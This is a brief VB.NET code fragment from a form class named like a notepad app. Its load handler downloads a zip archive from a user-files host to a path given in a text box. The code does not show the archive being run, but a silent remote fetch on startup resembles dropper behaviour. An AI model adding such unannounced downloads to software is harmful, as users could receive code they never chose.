...
Public Class Notepad__
    ...
    Private Sub Notepad___Load(sender As Object, e As EventArgs) Handles MyBase.Load
        ...
        download.DownloadFileAsync(New Uri("https://612092f6-6003-49d0-8fe5-2e737d705081.usrfiles.com/archives/612092_a6a289d9c4ad4fbc9199437a95ec63bb.zip"), TextBox2.Text)
